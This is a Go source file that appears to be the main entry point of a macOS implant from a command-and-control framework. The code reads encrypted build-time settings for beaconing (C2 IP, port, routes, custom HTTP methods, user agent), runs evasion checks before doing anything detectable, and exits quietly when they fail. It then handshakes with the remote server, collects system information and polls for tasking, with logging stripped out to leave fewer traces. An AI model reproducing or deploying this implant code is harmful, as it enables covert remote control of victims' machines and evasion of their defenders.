// server/docker/payloads/Darwin/main.go

//go:build darwin
// +build darwin

package main

import (
	"fmt"
	// "log"
	"os"
	"time"
)

// Environment variables set during build
var (
	// Non-encrypted values
	xorKey   string
	clientID string // This is now used as both initial and current client ID
	sleep    string
	jitter   string

	// Encrypted values
	userAgent          string
	contentType        string
	customHeaders      string
	getRoute           string
	postRoute          string
	getMethod          string // NEW: Custom HTTP method for GET operations
	postMethod         string // NEW: Custom HTTP method for POST operations
	getClientIDName    string
	getClientIDFormat  string
	postClientIDName   string
	postClientIDFormat string
	postSecretName     string
	postSecretFormat   string
	publicKey          string
	secret             string
	protocol           string
	ip                 string
	port               string
)

// Global HandshakeManager instance
var handshakeManager *HandshakeManager

func main() {
	// CRITICAL: Perform safety checks as the VERY FIRST operation
	// This must happen before any logging, network activity, or system calls
	// that could reveal the payload's presence
	if !PerformSafetyChecks() {
		// Safety checks failed - perform decoy activity and exit silently
		debugSafetyChecks()
		os.Exit(1)
	}

	// If we reach here, all safety checks passed
	// Continue with normal payload initialization

	// Initialize logging
	// log.SetPrefix("[Payload] ")
	// log.SetFlags(log.LstdFlags) // Removed Lshortfile flag

	// Create HandshakeManager instance
	var err error
	handshakeManager, err = NewHandshakeManager()
	if err != nil {
		//log.Printf("Failed to create HandshakeManager: %v\n", err)
		os.Exit(1)
	}

	// Set initial clientID
	handshakeManager.SetClientID(clientID)

	// Perform initial handshake (WITHOUT starting polling)
	//log.Println("Starting initial handshake process...")
	if err := handshakeManager.PerformHandshake(); err != nil {
		//log.Printf("Initial handshake failed: %v\n", err)
		// Implement retry logic with backoff
		for retries := 1; retries <= 3; retries++ {
			//log.Printf("Retrying handshake (attempt %d/3)...\n", retries)
			time.Sleep(time.Duration(retries) * 5 * time.Second)
			if err := handshakeManager.PerformHandshake(); err == nil {
				break
			} else if retries == 3 {
				//log.Printf("All handshake attempts failed. Last error: %v\n", err)
				os.Exit(1)
			}
		}
	}

	// After successful handshake, update the global clientID
	clientID = handshakeManager.GetCurrentClientID()
	//log.Println("Initial handshake successful")

	// Get current configuration for logging purposes
	//currentClientID := handshakeManager.GetCurrentClientID()
	getURL, postURL := handshakeManager.GetCurrentURLs()

	// Log configuration including custom methods
	//log.Printf("Current Configuration:")
	//log.Printf("- Client ID: %s", currentClientID)
	//log.Printf("- GET URL: %s", getURL)
	//log.Printf("- POST URL: %s", postURL)
	//log.Printf("- HTTP Methods: GET=%s, POST=%s",
	//handshakeManager.decryptedValues["GET Method"],  // Changed to match
	//handshakeManager.decryptedValues["POST Method"]) // Changed to match

	// START POLLING HERE - Only start it once after successful handshake
	sysInfoReport, err := CollectSystemInfo(clientID)
	if err != nil {
		//log.Fatalf("Failed to collect system information: %v", err)
	}

	pollConfig := PollConfig{
		GetURL:          getURL,
		PostURL:         postURL,
		DecryptedValues: handshakeManager.decryptedValues,
	}

	if err := startPolling(pollConfig, sysInfoReport); err != nil {
		//log.Fatalf("Failed to start polling: %v", err)
	}

	// Keep the main goroutine running
	select {}
}

// refreshHandshake performs a new handshake when needed
func refreshHandshake() error {
	// Before refreshing, check if safety conditions still apply
	// This is important for long-running payloads that might exceed working hours
	// or hit a kill date during execution
	if !PerformSafetyChecks() {
		//log.Println("Safety check failed during refresh - terminating")
		// Gracefully stop polling and exit
		StopPolling()
		os.Exit(1)
	}

	//log.Println("Initiating fresh handshake...")

	// Stop existing polling before starting handshake
	StopPolling()

	// Perform new handshake (this will NOT start polling anymore)
	if err := handshakeManager.RefreshHandshake(); err != nil {
		return err
	}

	// Update global clientID after successful refresh
	clientID = handshakeManager.GetCurrentClientID()

	// Get current URLs for logging
	getURL, postURL := handshakeManager.GetCurrentURLs()

	// Collect system info for new polling session
	sysInfoReport, err := CollectSystemInfo(clientID)
	if err != nil {
		return fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Initialize new polling config
	pollConfig := PollConfig{
		GetURL:          getURL,
		PostURL:         postURL,
		DecryptedValues: handshakeManager.decryptedValues,
	}

	// Start new polling with updated configuration
	if err := startPolling(pollConfig, sysInfoReport); err != nil {
		return fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	//log.Println("Fresh handshake completed successfully")
	return nil
}

// debugSafetyChecks is a helper function for testing safety checks during development
// Stripped in production builds
func debugSafetyChecks() {
	// Debug output removed for production
}
